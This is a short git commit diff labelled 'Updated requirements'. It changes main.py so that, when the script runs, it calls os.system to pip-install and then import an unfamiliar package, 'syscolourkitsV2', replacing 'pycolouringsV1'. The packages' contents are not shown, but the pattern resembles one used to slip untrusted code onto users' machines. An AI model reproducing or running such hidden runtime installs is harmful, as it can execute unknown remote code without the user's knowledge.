3afc86396a1548eb2a7b73071b51a957a639ef17
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-10 00:15:48 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycolouringsV1")
-import pycolouringsV1
+os.system("pip install syscolourkitsV2")
+import syscolourkitsV2
 import random
 import requests
 import time
